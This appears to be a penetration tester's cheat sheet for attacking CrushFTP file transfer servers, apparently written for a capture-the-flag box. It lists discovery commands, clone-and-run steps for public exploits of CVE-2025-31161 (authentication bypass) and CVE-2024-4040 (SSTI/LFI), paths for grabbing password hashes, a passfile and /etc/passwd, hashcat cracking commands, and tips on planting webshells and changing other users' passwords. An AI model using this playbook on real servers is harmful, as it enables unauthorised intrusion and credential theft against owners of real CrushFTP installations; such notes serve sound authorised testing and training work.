# CrushFTP

Enterprise file transfer server - often runs in Docker containers.

**Common Paths:** `/WebInterface/login.html`, subdomain `ftp.domain.com`

---

## Discovery

```bash
# VHost enumeration
gobuster vhost --url http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# Common subdomain
ftp.TARGET
```

**Indicators:**
- Login page redirects to `/WebInterface/login.html`
- Server header: `CrushFTP HTTP Server`
- Cookie names: `CrushAuth`, `currentAuth`

---

## CVE-2025-31161 - Authentication Bypass (Race Condition)

**Affects:** CrushFTP 10.x, 11.x before 11.3.1

Enumerate users and create arbitrary accounts via race condition.

### Exploits

```bash
# Go version (recommended)
git clone https://github.com/0xDTC/CrushFTP-auth-bypass-CVE-2025-31161.git
cd CrushFTP-auth-bypass-CVE-2025-31161

# Enumerate users and create account
./cve-2025-31161 -p 80 -t ftp.TARGET -au
# Enter username and password when prompted

# Python version (user enumeration)
git clone https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309.git
python3 watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.TARGET
```

### Manual User Enumeration

Race condition on `getUserList` endpoint reveals usernames:
```
[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
```

---

## CVE-2024-4040 - SSTI/LFI

**Affects:** CrushFTP < 10.7.1, < 11.1.0

```bash
git clone https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC.git
python3 crushed.py -t http://ftp.TARGET
```

---

## Post-Exploitation (After Login)

### File Download

1. Login to CrushFTP web interface
2. Go to User Preferences → Browse server files
3. Add files/directories to your user's accessible paths
4. Return to main page and download

### Key Files to Grab

```
/app/CrushFTP11/users/MainUsers/*/user.XML    # User configs with password hashes
/app/CrushFTP11/users/passfile                 # May contain plaintext passwords
/etc/passwd
/etc/hosts
```

### User.XML Password Hash Extraction

```xml
<!-- SHA256 format -->
<password>SHA256:d9eca4956a9d757ba0f007403f73b0d40d79be5d1fba36bc6ce64f98d9c9e88d</password>

<!-- SHA512 format -->
<password>SHA512:eeaeabe70899e53be528455a16fb797cfa74cba4f63d8a1980072a2a8f175db5269525283da852ce9f24cd407e4c63256aa383cac5b59da9bf1664d4d30359a6</password>
```

### Cracking CrushFTP Hashes

```bash
# SHA256 (mode 1400)
hashcat -a 0 -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# SHA512 (mode 1700)
hashcat -a 0 -m 1700 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Pivoting via CrushFTP

If you have admin access:
- Change other user's passwords
- Upload files to web directories for webshell access
- Check which directories users can write to

---

## Config Paths

```
/app/CrushFTP11/
├── users/
│   ├── MainUsers/
│   │   ├── crushadmin/user.XML
│   │   ├── ben/user.XML
│   │   └── jenna/user.XML
│   └── passfile
├── prefs.XML
└── server_settings.XML
```

---

## Notes

- Often runs in Docker (check `/etc/hosts`, `os-release`)
- Password reuse common between CrushFTP and SSH
- Admin accounts may have access to entire filesystem (`root_dir: /`)
